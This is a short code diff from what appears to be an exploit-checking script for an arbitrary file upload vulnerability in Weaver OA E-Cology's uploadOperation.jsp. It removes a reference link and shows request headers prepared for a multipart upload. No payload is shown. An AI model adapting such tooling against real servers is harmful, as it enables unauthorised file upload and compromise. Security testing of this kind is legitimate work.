@@ -6,9 +6,8 @@ def verify(url):
     result = {
         'name': '泛微OA E-Cology uploadOperation.jsp 任意文件上传(2022HVV)',
         'vulnerable': False,
-        'attack': True,
-        'about': 'http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20uploadOperation.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html'
-    }
+        'attack': True
+     }
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
         'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc',
